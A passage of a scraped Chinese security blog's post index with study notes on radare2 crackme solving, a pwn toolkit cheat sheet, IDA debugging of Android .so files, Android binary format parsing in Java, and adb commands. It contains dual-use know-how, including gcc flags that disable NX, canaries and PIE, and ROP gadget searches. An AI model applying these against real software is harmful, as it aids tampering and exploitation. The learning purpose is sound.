值\n","date":"2019-02-20T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/","title":"CTF-PWN刷题记录-CTFWiki_1栈溢出"},{"content":"radare2+cutter使用指南 0x00 介绍 radare2 一个很实用的二进制分析和调试工具\ncutter 是r2的GUI版。\n0x01 安装 支持的平台有如下：\nWindows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.\nLinux平台下直接\n1 git clone https://github.com/radare/radare2cd radare2sys/install.sh //(or sys/user.sh) Windows下可以下载二进制安装包安装。官网下载\nWindows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。\n0x03 工具介绍 r2常用的包含有一下组件：\nrax2 用于数值转换\nrasm2 反汇编和汇编\nrabin2 查看文件格式\nradiff2 对文件进行 diff\nragg2/ragg2­cc 开发shellcode工具\nrahash2 各种密码算法， hash算法\nradare2 整合了所有工具\n使用帮助直接-h\nrax2 rasm2 rabin2 eg: (-I)\nradiff2 ragg2/ragg2­cc rahash2 radare2 (最常用) 可缩写为r2 0x04 r2 实战学习 challenge来源于：http://reversing.kr\n先查看一下文件信息：\nGUI?:\n用r2载入，自动分析aaa命令：\nvv 命令查看界面：\n注意0x00401080 调用了GetDlgItemTextA\ns 调到main函数，查看main的汇编代码：\npdc查看伪代码：\n大写的VV命令查看图形界面 使用hijk来进行界面移动。\n看到调用地址0x401020，s跳过去 ；发现没解析 可使用af来解析。\n看到GetDlgTemTextA调用：\n函数调用\n差不多逻辑就是一直比对字符串，从第二位开始比最后第一位\n得到Ea5yR3versing\n命令记不住或者想知道有些什么命令可以用就可以加个？号查询\n0x05 Cutter的使用 多图待补 Radare2 Book\n","date":"2019-01-02T00:00:00+08:00","permalink":"https://ykiko.top/p/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"radare2+cutter使用指南"},{"content":"pytorch学习_1安装 前言 本来想着用tensorflow的 然而GPU版总是报各种各样的BUG\n所以打算入坑一下学pytorch\n配置：win10+i76700HQ+GTX1060+16G\n软件版本：CUDA10+python3.6+pytorch 1 源码编译\n尝试1：官方安装方法不支持 CUDA 10 太坑，社区有编译通过的，所以只有自己编译试试\n报各种异常，但是没停，那就等等\nCPU被占满，巨卡。\n一觉起来之后：安装失败\n尝试2：等着完全支持CUDA10之后在用GPU跑吧。\n妥协：用阿里云的学生服务器装了CPU的版本：顺便把TensorFlow 也给装了。。\n然而 在一个星期之后 pytorch1.0出来了 支持了CUDA10 nice\n1 2 pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl pip3 install torchvision 期间没有遇到任何问题 真舒畅。。。\n","date":"2018-12-08T00:00:00+08:00","permalink":"https://ykiko.top/p/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/","title":"pytorch学习_1安装"},{"content":"PWN_小tools的使用 GCC 编译常用命令 不带选项 gcc test.c 将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。 -o 指定生成的输出文件； gcc test.c -o test 将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。 -E 仅执行编译预处理； gcc -E test.c -o test.i 将test.c预处理输出test.i文件。 -S 将C代码转换为汇编代码； gcc -S test.i 将预处理输出文件test.i汇编成test.s文件。 -c 仅执行编译操作，不进行连接操作。 gcc -c test.s 将汇编输出文件test.s编译输出test.o文件。 -wall 显示警告信息； **无选项链接** gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。 -O 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长 gcc -O1 test.c -o test 关掉DEP/NX（堆栈不可执行） gcc -z execstack -o level level.c 关掉Stack Protector/Canary（栈保护） gcc -fno-stack-protector -o level level.c 关掉程序ASLR/PIE（程序随机化保护） gcc -no-pie level level.c 64位linux下面的GCC编译出一个32位可执行程序 gcc -m32 -z execstack -fno-stack-protector -o level level.c GDB常用调试命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 gcc -g main.c //在目标文件加入源代码的信息 gdb a.out (gdb) start //开始调试 (gdb) n //一条一条执行 (gdb) step/s //执行下一条，如果函数进入函数 (gdb) backtrace/bt //查看函数调用栈帧 (gdb) info/i locals //查看当前栈帧局部变量 (gdb) frame/f //选择栈帧，再查看局部变量 (gdb) print/p //打印变量的值 (gdb) finish //运行到当前函数返回 (gdb) set var sum=0 //修改变量值 (gdb) list/l 行号或函数名 //列出源码 (gdb) display/undisplay sum //每次停下显示变量的值/取消跟踪 (gdb) break/b 行号或函数名 //设置断点 (gdb) continue/c //连续运行 (gdb) info/i breakpoints //查看已经设置的断点 (gdb) delete breakpoints 2 //删除某个断点 (gdb) disable/enable breakpoints 3 //禁用/启用某个断点 (gdb) break 9 if sum != 0 //满足条件才激活断点 (gdb) run/r //重新从程序开头连续执行 (gdb) watch input[4] //设置观察点 (gdb) info/i watchpoints //查看设置的观察点 (gdb) x/7b input //打印存储器内容，b--每个字节一组，7--7组 (gdb) disassemble //反汇编当前函数或指定函数 (gdb) si // 一条指令一条指令调试 而 s 是一行一行代码 (gdb) info registers // 显示所有寄存器的当前值 (gdb) x/20 $esp //查看内存中开始的20个数 ni 单步执行不进入 si 单步执行并进入 disas addr 对地址addr处的指令进行反汇编，addr可以是函数名 checksec 查看elf编译的保护选项。 查壳 upx -d file\nobjjump objdump是二进制文件快速查看工具。 常用命令：\n1. `objdump -d [file]` 查看文件的所有汇编代码 1. `objdump -f [file]` 查看文件的每个文件的整体头部摘要 ####python\npython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | ./file python以命令方式执行并把结果传递给filepython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | xargs ./file python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。os.system() 创建一个子进程os.putenv(\u0026ldquo;name\u0026rdquo;, \u0026ldquo;value\u0026rdquo;) 添加一个环境变量\npwntools 参考 http://pwntools.readthedocs.io/en/stable/ （官网介绍）\n[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/) [http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/) 一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。\n常用的模块有下面几个： - ==asm==:汇编与反汇编 - ==dynelf==:用于远程符号泄露，需要提供leak方法 - ==elf==:对elf文件进行操作 - ==gdb==:配合gdb进行调试 - ==memleak==:用于内存泄漏 - ==shellcraft==: shellcode的生成器 - ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE - ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等 pwndbg arena 堆检查\nmp 显示堆\nbins,fastbins,unsorted,smallbins,largebins\nheap\ntop_chunk\nprocinfo 查看当前进程状态\nrop rop --grep \u0026quot;pop rdi\u0026quot; -- --nojop --nosys --depth 2\nsearch search -s “/bin/sh”\nvvmap 虚拟内存映射\ntelescope 检查内存转储\n","date":"2018-10-22T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"PWN_小tools的使用"},{"content":"IDA_动态调试.so_基本步骤 IDA 动态调试.so 基本步骤 待补图 0x00 IDA快捷键 Shirt+F12 字符串窗口\nF5大法好 反汇编\nCtrl+S 查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）\nG 快速跳转到对应地址。s\n调试-F7单步进入调试、F8单步、F9运行\n0x01 方法一 获取运行Android_server。\nandroid_server文件放在IDA安装目录下的注意版本的不同。\n之后只需 push android_server /data/local/tmp/。\n之后adb shell，su ，cd /data/local/tmp/。\n可能还得chmod 755 android_server 才有权限运行。\n建立通信、attach进程。\nadb forward tcp:23946 tcp:23946命令。\n在IDA的Debugger选项中attach进程。\n加载so、找函数下断点\n双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。\n0x02 方法二 无法加载so文件需要在加载之前断点。反调试之类\nDebug方式启动app。需要应用可调试开启\nadb shell am start -D -n 包名/.MainActivity\n方法一的1，2两步 勾选选项。\njdb attach程序\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n开始调试 同上\n","date":"2018-08-31T00:00:00+08:00","permalink":"https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/","title":"IDA_动态调试.so_基本步骤"},{"content":"Android应用安全防护和逆向分析-基础篇5-6 一、 基础篇⑤-⑥ 这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。\n第五章 AndroidManifest.xml格式解析 AndroidManifest.xml\nAndroidManifest.xml文件格式图\n头部信息 文件魔数：4bytes。\n文件大小：4bytes。\nChunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。\nSting Chunk ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。\nChunkType：类型，固定4bytes（0x001C001)。\nChunkSize：大小，4bytes。\nStringCount：字符串的个数 ，4bytes。\nStyleCount ：样式的个数，4bytes。\nUnknown ：位置区域。4bytes。\nStringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。\nStylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。\nStringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。\nStyleOffsets：每个样式的偏移值，大小为StyleChunk*4。\n如何读取这个文件？\nResourceld Chunk ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID\nChunkType：类型，固定4bytes（0x00080108）。\nChunkSize：大小，4bytes。\nResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。\n解析？\nStart Namespace Chunk：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。\nChunk Type：类型，固定4bytes。（0x00100100)。\nChunk Size：大小，4bytes。\nLine Number ：AndroidMaifest文件中行号，4bytes。\nUnknown：未知区域,4bytes。\nPrefix：命名空间的前缀（在字符串中的索引值），eg:android。\nUri：命名空间的URI（在字符串中的索引值），eg:http://schemas.android.com/apk/res/android\nStart Tag Chunk：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。\nChunk Type：类型，固定4bytes。（0x00100102)。\nChunk Size：大小，4bytes。\nLine Number ：对应AndroidMaifest中的行号，4bytes。\nUnknown：未知区域,4bytes。\nNamespace Uri ：命名空间的Uri，4bytes。\nName：标签名称（在字符串中的索引值），4bytes。\nFlags：标签的类型，4bytes。eg：是开始标签还是结束标签？\nAttributes Counk：便签中包含的属性的个数，4bytes。\nClass Attribute：标签包含的类属性，4bytes。\nAttributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4\u0026quot;个字节。\nAXMLPrinter工具 aapt 工具 第六章 resourec.arsc文件格式解析 资源文件id格式 resourec.arsc文件格式\n数据结构 上图\n头部信息\nresourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class ResChunkHeader{ public short type; //当前chunk的类型 public short headerSize; //当前chunk的头部大小 public int size; //当前chunk的大小 public int getHeaderSize(){ return 2+2+4 } @Override public String toString(){ return \u0026#34;type:\u0026#34;+Utils.bytesToHexString( Utils.int2Byte(type))+\u0026#34;,headerSize:\u0026#34;+headerSize+\u0026#34;,size:\u0026#34;+size; } } 资源索引表的头部信息\nresourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ResTableHeader { public ResChunkHeader header; //就是标准的Chunk头部信息格式 public int packageCount; //被编译的资源包的个数 public ResTableHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;packageCount:\u0026#34;+packageCount; } } 资源项的值字符串资源池接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。\n包含了所有在资源包里面定义的资源项的值字符串，结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class ResStringPoolHeader { public ResChunkHeader header; //标准的Chunk头部信息结构 public int stringCount; //字符串的个数 public int styleCount; //字符串样式的个数 public final static int SORTED_FLAG = 1; public final static int UTF8_FLAG = (1\u0026lt;\u0026lt;8); public int flags; //字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值 public int stringsStart; //字符串内容块相对于其头部的距离 public int stylesStart; //字符串样式块相对于其头部的距离 public ResStringPoolHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;stringCount:\u0026#34;+stringCount+\u0026#34;,styleCount:\u0026#34;+styleCount+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,stringStart:\u0026#34;+stringsStart+\u0026#34;,stylesStart:\u0026#34;+stylesStart; } } 字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：\nlen = (((hbyte \u0026amp; 0x7F) \u0026lt;\u0026lt; 8)) | lbyte;\n如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。\nPackage数据块\n这个数据块记录编译包的元数据，头部信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTablePackage { public ResChunkHeader header; //Chunk的头部信息数据结构 public int id; //包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01； public char[] name = new char[128]; //包名 public int typeStrings; //类型字符串资源池相对头部的偏移 public int lastPublicType; //最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途 public int keyStrings; //资源项名称字符串相对头部的偏移 public int lastPublicKey; // 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途 public ResTablePackage(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34;+\u0026#34;,id=\u0026#34;+id+\u0026#34;,name:\u0026#34;+name.toString()+\u0026#34;,typeStrings:\u0026#34;+typeStrings+\u0026#34;,lastPublicType:\u0026#34;+lastPublicType+\u0026#34;,keyStrings:\u0026#34;+keyStrings+\u0026#34;,lastPublicKey:\u0026#34;+lastPublicKey; } } 类型规范数据块\n用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableTypeSpec { public final static int SPEC_PUBLIC = 0x40000000; public ResChunkHeader header; //Chunk的头部信息结构 public byte id; //标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。 public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public ResTableTypeSpec(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount; } } 资源类型项数据块\n描述资源项的具体信息，名称、值、配置等信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class ResTableType { public ResChunkHeader header; //Chunk的头部信息结构 public final static int NO_ENTRY = 0xFFFFFFFF; public byte id; //标识资源的Type ID public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public int entriesStart; //等于资源项数据块相对头部的偏移值。 public ResTableConfig resConfig; //指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等 public ResTableType(){ header = new ResChunkHeader(); resConfig = new ResTableConfig(); } public int getSize(){ return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount+\u0026#34;,entriesStart:\u0026#34;+entriesStart; } } ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class ResTableEntry { public final static int FLAG_COMPLEX = 0x0001; public final static int FLAG_PUBLIC = 0x0002; public short size; public short flags; public ResStringPoolRef key; public ResTableEntry(){ key = new ResStringPoolRef(); } public int getSize(){ return 2+2+key.getSize(); } @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,key:\u0026#34;+key.toString()+\u0026#34;,str:\u0026#34;+ParseResourceUtils.getKeyString(key.index); } } ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableMapEntry extends ResTableEntry{ public ResTableRef parent; public int count; public ResTableMapEntry(){ parent = new ResTableRef(); } @Override public int getSize(){ return super.getSize() + parent.getSize() + 4; } @Override public String toString(){ return super.toString() + \u0026#34;,parent:\u0026#34;+parent.toString()+\u0026#34;,count:\u0026#34;+count; } } ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.wjdiankong.parseresource.type; /** struct ResTable_map { //bag资源项ID ResTable_ref name; //bag资源项值 Res_value value; }; * @author i * */ public class ResTableMap { public ResTableRef name; public ResValue value; public ResTableMap(){ name = new ResTableRef(); value = new ResValue(); } public int getSize(){ return name.getSize() + value.getSize(); } @Override public String toString(){ return name.toString()+\u0026#34;,value:\u0026#34;+value.toString(); } } 如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 public class ResValue { //dataType字段使用的常量 public final static int TYPE_NULL = 0x00; public final static int TYPE_REFERENCE = 0x01; public final static int TYPE_ATTRIBUTE = 0x02; public final static int TYPE_STRING = 0x03; public final static int TYPE_FLOAT = 0x04; public final static int TYPE_DIMENSION = 0x05; public final static int TYPE_FRACTION = 0x06; public final static int TYPE_FIRST_INT = 0x10; public final static int TYPE_INT_DEC = 0x10; public final static int TYPE_INT_HEX = 0x11; public final static int TYPE_INT_BOOLEAN = 0x12; public final static int TYPE_FIRST_COLOR_INT = 0x1c; public final static int TYPE_INT_COLOR_ARGB8 = 0x1c; public final static int TYPE_INT_COLOR_RGB8 = 0x1d; public final static int TYPE_INT_COLOR_ARGB4 = 0x1e; public final static int TYPE_INT_COLOR_RGB4 = 0x1f; public final static int TYPE_LAST_COLOR_INT = 0x1f; public final static int TYPE_LAST_INT = 0x1f; public static final int COMPLEX_UNIT_PX\t=0, COMPLEX_UNIT_DIP\t=1, COMPLEX_UNIT_SP\t=2, COMPLEX_UNIT_PT\t=3, COMPLEX_UNIT_IN\t=4, COMPLEX_UNIT_MM\t=5, COMPLEX_UNIT_SHIFT\t=0, COMPLEX_UNIT_MASK\t=15, COMPLEX_UNIT_FRACTION\t=0, COMPLEX_UNIT_FRACTION_PARENT=1, COMPLEX_RADIX_23p0\t=0, COMPLEX_RADIX_16p7\t=1, COMPLEX_RADIX_8p15\t=2, COMPLEX_RADIX_0p23\t=3, COMPLEX_RADIX_SHIFT\t=4, COMPLEX_RADIX_MASK\t=3, COMPLEX_MANTISSA_SHIFT\t=8, COMPLEX_MANTISSA_MASK\t=0xFFFFFF; public short size; //ResValue的头部大小 public byte res0; //保留，始终为0 public byte dataType; //数据的类型,可以从上面的枚举类型中获取 public int data; //数据对应的索引 public int getSize(){ return 2 + 1 + 1 + 4; } public String getTypeStr(){ switch(dataType){ case TYPE_NULL: return \u0026#34;TYPE_NULL\u0026#34;; case TYPE_REFERENCE: return \u0026#34;TYPE_REFERENCE\u0026#34;; case TYPE_ATTRIBUTE: return \u0026#34;TYPE_ATTRIBUTE\u0026#34;; case TYPE_STRING: return \u0026#34;TYPE_STRING\u0026#34;; case TYPE_FLOAT: return \u0026#34;TYPE_FLOAT\u0026#34;; case TYPE_DIMENSION: return \u0026#34;TYPE_DIMENSION\u0026#34;; case TYPE_FRACTION: return \u0026#34;TYPE_FRACTION\u0026#34;; case TYPE_FIRST_INT: return \u0026#34;TYPE_FIRST_INT\u0026#34;; case TYPE_INT_HEX: return \u0026#34;TYPE_INT_HEX\u0026#34;; case TYPE_INT_BOOLEAN: return \u0026#34;TYPE_INT_BOOLEAN\u0026#34;; case TYPE_FIRST_COLOR_INT: return \u0026#34;TYPE_FIRST_COLOR_INT\u0026#34;; case TYPE_INT_COLOR_RGB8: return \u0026#34;TYPE_INT_COLOR_RGB8\u0026#34;; case TYPE_INT_COLOR_ARGB4: return \u0026#34;TYPE_INT_COLOR_ARGB4\u0026#34;; case TYPE_INT_COLOR_RGB4: return \u0026#34;TYPE_INT_COLOR_RGB4\u0026#34;; } return \u0026#34;\u0026#34;; } /*public String getDataStr(){ if(dataType == TYPE_STRING){ return ParseResourceUtils.getResString(data); }else if(dataType == TYPE_FIRST_COLOR_INT){ return Utils.bytesToHexString(Utils.int2Byte(data)); }else if(dataType == TYPE_INT_BOOLEAN){ return data==0 ? \u0026#34;false\u0026#34; : \u0026#34;true\u0026#34;; } return data+\u0026#34;\u0026#34;; }*/ public String getDataStr() { if (dataType == TYPE_STRING) { return ParseResourceUtils.getResString(data); } if (dataType == TYPE_ATTRIBUTE) { return String.format(\u0026#34;?%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_REFERENCE) { return String.format(\u0026#34;@%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_FLOAT) { return String.valueOf(Float.intBitsToFloat(data)); } if (dataType == TYPE_INT_HEX) { return String.format(\u0026#34;0x%08X\u0026#34;,data); } if (dataType == TYPE_INT_BOOLEAN) { return data!=0?\u0026#34;true\u0026#34;:\u0026#34;false\u0026#34;; } if (dataType == TYPE_DIMENSION) { return Float.toString(complexToFloat(data))+ DIMENSION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType == TYPE_FRACTION) { return Float.toString(complexToFloat(data))+ FRACTION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType \u0026gt;= TYPE_FIRST_COLOR_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_COLOR_INT) { return String.format(\u0026#34;#%08X\u0026#34;,data); } if (dataType \u0026gt;= TYPE_FIRST_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_INT) { return String.valueOf(data); } return String.format(\u0026#34;\u0026lt;0x%X, type 0x%02X\u0026gt;\u0026#34;,data, dataType); } private static String getPackage(int id) { if (id\u0026gt;\u0026gt;\u0026gt;24==1) { return \u0026#34;android:\u0026#34;; } return \u0026#34;\u0026#34;; } public static float complexToFloat(int complex) { return (float)(complex \u0026amp; 0xFFFFFF00)*RADIX_MULTS[(complex\u0026gt;\u0026gt;4) \u0026amp; 3]; } private static final float RADIX_MULTS[]={ 0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F }; private static final String DIMENSION_UNITS[]={ \u0026#34;px\u0026#34;,\u0026#34;dip\u0026#34;,\u0026#34;sp\u0026#34;,\u0026#34;pt\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;mm\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; private static final String FRACTION_UNITS[]={ \u0026#34;%\u0026#34;,\u0026#34;%p\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,dataType:\u0026#34;+getTypeStr()+\u0026#34;,data:\u0026#34;+getDataStr(); } } 以上代码来自于书的原作者的博客：https://blog.csdn.net/jiangwei0910410003/article/details/50628894\n博客里还有如何解析操作，留看。\n总结 这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。\n","date":"2018-08-29T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/","title":"Android应用安全防护和逆向分析-基础篇5-6"},{"content":"Android应用安全防护和逆向分析-基础篇4 一、 基础篇④ 第四章 so文件格式解析 ELF文件格式\nso文件-\u0026gt;elf文件，文件格式看图（引用自@非虫）：\n解析工具\nreadelf 常用命令\nreadelf -h xxx.so 查头部信息\nreadelf -S xxx.so 查节（Section）信息\nreadelf -l xxx.so 查段（Program）信息\nreadelf -a xxx.so 查全部信息\n解析ELF文件\n动手解析一个elf文件 。。。\n太水 这里的内容\n直接去看源码实现用java解析elf文件信息https://github.com/fourbrother/parse_androidso\nELF 相关内容还是单独详细分析 单独写一篇吧\nELF书籍《Linux二进制分析》\n总结 加固脱壳必须掌握的知识点。\n","date":"2018-08-22T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/","title":"Android应用安全防护和逆向分析-基础篇4"},{"content":"Android应用安全防护和逆向分析-基础篇3 一、 基础篇③ 第三章 Android中开发与逆向常用命令总结 1. 基础命令 1.1 cat命令 ​ 查看文件内容 结合grep进行过滤\n1.2 echo/touch命令 ​ 写文件 配个定向符使用\n2. 非shell命令 2.1 adb shell dumpsys sctivity top ​ 说明：查看当前应用的activity信息\n​ 用法：运行需要查看的应用\n​ 如果直接运行 adb shell dmpsys会把当前系统中的所有应用运行的四大组件都打印出来 内容非常多 使用信息重定向来进行选择：可借助Windows的start命令\n2.2 adb shell dumpsys package ​ 说明：查看指定包名应用的详细信息 （相当于AndroidManifest.xml的内容）\n​ 用法：adb shell dumpsys package [pkgname]\n2.3 adb shell dumpsys meminfo ​ 说明：查看指定进程名或者进程id的内存信息\n​ 用法：adb shell dumpsys meminfo [pname/pid]\n​ 和后面的top命令结合使用 可以分析应用的性能消耗情况\n2.4 adb shell dump dbnfo ​ 说明：查看指定包名应用的数据库存储信息（包括存储的SQL语句）\n​ 用法：adb shell dump dbnfo [packagename]\n2.5 adb install ​ 说明：安装应用包apk文件\n​ 用法：adb install [apk文件]\n​ 升级安装 使用apk install -r [apk文件]\n2.6 adb uninstall ​ 卸载\n2.7 adb pull ​ 从设备复制到本地\n​ adb pull 设备目录 本地目录\n2.8 adb push ​ 从本地复制到设备\n​ 同上\n2.9 adb shell screencap ​ 截屏\n​ adb shell scteencap -p 截图文件目录\n​ 快速截取手机屏幕\n1 2 3 adb shell screencap -p /sdcard/tmp.png adb pull /sdcard/tmp.png D:\\ start D:\\tmp.png 2.10 adb shell screenrecord ​ 录屏\n​ adb shell screenrecord 路径\n2.11 adb shell input text ​ 输入文本内容\n​ adb shell input text [需要输入文本框的内容]\n​ eg: 让输入内容的文本框回去焦点\n​ adb shell input text 'hello world'\n​ 这个命令可以模拟物理键盘、虚拟键盘、滑动、滚动等事件。\n2.12 adb forward ​ 端口转发命令\n​ adb forward [远程协议：端口号]· [设备协议：端口号 